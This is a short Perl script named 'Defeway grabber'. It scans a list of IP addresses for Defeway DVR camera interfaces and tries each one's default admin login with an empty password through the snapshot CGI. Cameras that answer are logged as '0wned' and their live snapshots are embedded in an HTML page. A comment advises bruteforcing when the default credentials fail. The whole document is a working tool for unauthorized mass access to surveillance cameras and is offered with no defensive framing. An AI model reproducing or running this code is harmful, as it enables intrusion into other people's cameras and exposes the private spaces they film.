#!/usr/bin/perl
# For Defeway
# if creds default not work try bruteforce

use LWP::UserAgent;

system $^O eq 'MSWin32' ? 'cls' : 'clear';

print "\t\n       Defeway grabber\n\n\n";


open(op,"<$ARGV[0]") or die "$!";
while(<op>){
chomp($ips = $_);

my $ua = LWP::UserAgent->new();

$ua->agent("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");

my $req = $ua->get("http://".$ips."/")->content;

if($req =~/<span lxc_lang=\"index_2\" style=\"color:#000000\"><\/span>/) {

 print "  [".$ips."] => Defeway Detected \n\n";

    $req2 = $ua->get("http://".$ips."/cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=0")->code;
        print "   Testing Password Default \n\n";
   if($req2 =~/200/) {
    
    print "   [".$ips."] => Defeway 0wned \n\n";
    open(camm, ">>defeway.html");
    print camm "<h1>".$ips."<\/h1><br><br><iframe src=\"http:\/\/".$ips."\//cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=0\" width=\"640\" height=\"480\"><\/iframe><br><br>";
   close camm;
   } else { print "   Fail Try Bruteforce"; }
}
}
